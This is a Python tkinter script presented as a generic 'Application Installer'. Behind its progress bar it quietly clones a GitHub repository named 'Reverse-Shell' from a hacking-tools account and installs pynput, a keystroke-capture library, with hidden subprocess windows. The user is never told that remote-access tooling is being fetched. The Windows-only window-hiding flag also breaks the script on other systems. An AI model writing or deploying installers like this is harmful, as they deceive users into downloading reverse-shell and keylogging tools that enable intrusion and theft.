import tkinter as tk
from tkinter import ttk
import importlib.util
import subprocess
import threading
import sys
import os
import shutil
import platform
from typing import List
from urllib.request import urlopen
from urllib.error import URLError

REQUIRED_MODULES = ['colorama', 'psutil', 'pynput', 'requests']
REPO_URL = 'https://github.com/H-ckingTools/Reverse-Shell.git'
LOCAL_REPO_DIR = os.path.join(os.getcwd(), 'Reverse-Shell')
GIT_TIMEOUT = 30  # seconds
INSTALL_TIMEOUT = 300 
CHECK_INTERNET_URL = 'http://www.google.com'
WINDOW_WIDTH = 500
WINDOW_HEIGHT = 220

class AppInstaller:
    def __init__(self):
        self.running = True
        self.root = tk.Tk()
        self.root.title("Application Installer")
        self.root.geometry(f"{WINDOW_WIDTH}x{WINDOW_HEIGHT}")
        self.root.resizable(False, False)
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        
        # Center the window
        self._center_window()
        
        # Configure styles
        self._configure_styles()
        
        # Create UI elements
        self._create_widgets()
        
        # Start installation process
        self._start_installation()

    def _center_window(self):
        """Center the window on the screen."""
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width // 2) - (WINDOW_WIDTH // 2)
        y = (screen_height // 2) - (WINDOW_HEIGHT // 2)
        self.root.geometry(f'+{x}+{y}')

    def _configure_styles(self):
        """Configure ttk styles."""
        self.style = ttk.Style()
        self.style.configure("TLabel", font=("Segoe UI", 10))
        self.style.configure("TProgressbar", thickness=20)
        self.style.configure("Red.TLabel", foreground="red")
        self.style.configure("Green.TLabel", foreground="green")

    def _create_widgets(self):
        """Create and arrange all UI widgets."""
        # Main label
        self.main_label = ttk.Label(self.root, text="Preparing installation...")
        self.main_label.pack(pady=(15, 5))
        
        # Progress bar
        self.progress = ttk.Progressbar(self.root, length=450, mode='determinate')
        self.progress.pack(pady=5)
        
        # Status label
        self.status_label = ttk.Label(self.root, text="Initializing...")
        self.status_label.pack(pady=5)
        
        # Details label with scrollbar for longer messages
        self.details_frame = ttk.Frame(self.root)
        self.details_frame.pack(pady=5, fill=tk.X, padx=10)
        
        self.details_label = tk.Text(
            self.details_frame, 
            height=4, 
            wrap=tk.WORD, 
            font=("Segoe UI", 9),
            padx=5, 
            pady=5,
            state=tk.DISABLED
        )
        self.details_label.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        scrollbar = ttk.Scrollbar(self.details_frame, command=self.details_label.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.details_label.config(yscrollcommand=scrollbar.set)
        
        # Close button (initially hidden)
        self.close_button = ttk.Button(
            self.root, 
            text="Close", 
            command=self.on_close,
            state=tk.DISABLED
        )
        self.close_button.pack(pady=(5, 10))

    def _start_installation(self):
        """Start the installation process in a background thread."""
        self.install_thread = threading.Thread(target=self._installation_process, daemon=True)
        self.install_thread.start()
        self._start_idle_progress()

    def _start_idle_progress(self):
        """Start the idle progress animation."""
        self._update_progress_animation()

    def _update_progress_animation(self):
        """Update the progress bar animation."""
        if not self.running:
            return
            
        current_value = self.progress['value']
        if current_value < 100:
            self.progress['value'] = current_value + 1
            self.root.after(50, self._update_progress_animation)
        else:
            self.progress['value'] = 0
            self.root.after(50, self._update_progress_animation)

    def on_close(self):
        """Handle window close event."""
        self.running = False
        if hasattr(self, 'install_thread') and self.install_thread.is_alive():
            try:
                self.install_thread.join(timeout=1)
            except Exception:
                pass
        self.root.destroy()

    def _installation_process(self):
        """Main installation process running in background thread."""
        try:
            # Check internet connection first
            if not self._check_internet_connection():
                raise ConnectionError("No internet connection detected")
            
            # Stage 1: Check and install Git
            self._update_ui("Checking Requirements", "Verifying Git installation...", 10)
            git_path = self._ensure_git_installed()
            
            # Stage 2: Update repository
            self._update_ui("Updating Application", "Connecting to repository...", 30)
            self._update_repository(git_path)
            
            # Stage 3: Install dependencies
            self._update_ui("Installing Dependencies", "Checking required modules...", 60)
            self._install_dependencies()
            
            # Complete
            self._update_ui("Installation Complete", "All components installed successfully!", 100)
            self._append_details("Installation completed successfully.")
            self._enable_close_button()
            
        except Exception as e:
            self._update_ui("Installation Error", f"Error: {str(e)}", self.progress['value'])
            self._append_details("Please check your internet connection and try again.", error=True)
            self._enable_close_button()

    def _update_ui(self, main: str, status: str, value: float):
        """Update the UI elements safely from the background thread."""
        if not self.running:
            return
            
        self.root.after(0, lambda: self._safe_update(main, status, value))

    def _safe_update(self, main: str, status: str, value: float):
        """Thread-safe update of UI elements."""
        self.main_label.config(text=main)
        self.status_label.config(text=status)
        self.progress['value'] = value
        self.root.update_idletasks()

    def _append_details(self, message: str, error: bool = False):
        """Append a message to the details text area."""
        self.root.after(0, lambda: self._safe_append_details(message, error))

    def _safe_append_details(self, message: str, error: bool):
        """Thread-safe append to details text area."""
        self.details_label.config(state=tk.NORMAL)
        self.details_label.insert(tk.END, message + "\n")
        if error:
            self.details_label.tag_add("error", "end-2c linestart", "end-1c lineend")
            self.details_label.tag_config("error", foreground="red")
        self.details_label.config(state=tk.DISABLED)
        self.details_label.see(tk.END)

    def _enable_close_button(self):
        """Enable the close button when installation is complete or failed."""
        self.root.after(0, lambda: self.close_button.config(state=tk.NORMAL))

    def _check_internet_connection(self) -> bool:
        """Check if there's an active internet connection."""
        try:
            with urlopen(CHECK_INTERNET_URL, timeout=5) as response:
                return True
        except URLError:
            return False

    def _ensure_git_installed(self) -> str:
        """Ensure Git is installed and return the path to git executable."""
        git_path = shutil.which('git')
        
        if git_path:
            self._append_details(f"Git found at: {git_path}")
            return git_path
            
        # Git not found - try to install it
        self._append_details("Git not found. Attempting to install...")
        
        if platform.system() == "Windows":
            # For Windows, we can't easily install Git automatically
            raise Exception("Git is required but not found. Please install Git from https://git-scm.com/")
        else:
            # For Linux/macOS, try to install via package manager
            try:
                if platform.system() == "Linux":
                    subprocess.run(['sudo', 'apt-get', 'install', '-y', 'git'], 
                                  check=True, timeout=300)
                elif platform.system() == "Darwin":  # macOS
                    subprocess.run(['brew', 'install', 'git'], 
                                  check=True, timeout=300)
                
                git_path = shutil.which('git')
                if git_path:
                    self._append_details("Git installed successfully.")
                    return git_path
                else:
                    raise Exception("Git installation failed.")
                    
            except subprocess.CalledProcessError:
                raise Exception("Failed to install Git automatically.")
            except subprocess.TimeoutExpired:
                raise Exception("Git installation timed out.")

    def _update_repository(self, git_path: str):
        """Update or clone the repository."""
        if os.path.isdir(LOCAL_REPO_DIR) and os.path.isdir(os.path.join(LOCAL_REPO_DIR, ".git")):
            self._append_details("Existing repository found. Updating...")
            self._update_ui("Updating Application", "Pulling latest changes...", 40)
            
            try:
                subprocess.run(
                    [git_path, 'pull'],
                    cwd=LOCAL_REPO_DIR,
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=GIT_TIMEOUT,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                self._append_details("Repository updated successfully.")
                self._update_ui("Repository Updated", "Update complete", 50)
            except subprocess.TimeoutExpired:
                raise Exception("Repository update timed out.")
            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to update repository: {e.stderr.decode().strip()}")
        else:
            self._append_details("Cloning repository...")
            self._update_ui("Cloning Repository", "Downloading source code...", 20)
            
            try:
                subprocess.run(
                    [git_path, 'clone', REPO_URL, LOCAL_REPO_DIR],
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=GIT_TIMEOUT,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                self._append_details("Repository cloned successfully.")
                self._update_ui("Repository Cloned", "Download complete", 40)
            except subprocess.TimeoutExpired:
                raise Exception("Repository clone timed out.")
            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to clone repository: {e.stderr.decode().strip()}")

    def _install_dependencies(self):
        """Install required Python dependencies."""
        missing = self._get_missing_modules()
        if not missing:
            self._append_details("All required modules are already installed.")
            self._update_ui("Dependencies Check", "All modules present", 80)
            return

        total = len(missing)
        self._append_details(f"Found {total} missing modules to install.")
        
        for i, module in enumerate(missing):
            if not self.running:
                break

            progress = 60 + (i / total) * 40
            self._update_ui("Installing Dependencies", f"Installing {module} ({i+1}/{total})", progress)
            self._append_details(f"Installing {module}...")

            try:
                result = subprocess.run(
                    [sys.executable, "-m", "pip", "install", module],
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=INSTALL_TIMEOUT,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                self._append_details(f"Successfully installed {module}")
            except subprocess.TimeoutExpired:
                self._append_details(f"Timeout while installing {module}", error=True)
            except subprocess.CalledProcessError as e:
                self._append_details(f"Failed to install {module}: {e.stderr.decode().strip()}", error=True)

    def _get_missing_modules(self) -> List[str]:
        """Return a list of missing required modules."""
        return [m for m in REQUIRED_MODULES if not self._is_module_installed(m)]

    def _is_module_installed(self, module_name: str) -> bool:
        """Check if a Python module is installed."""
        try:
            return importlib.util.find_spec(module_name) is not None
        except Exception:
            return False
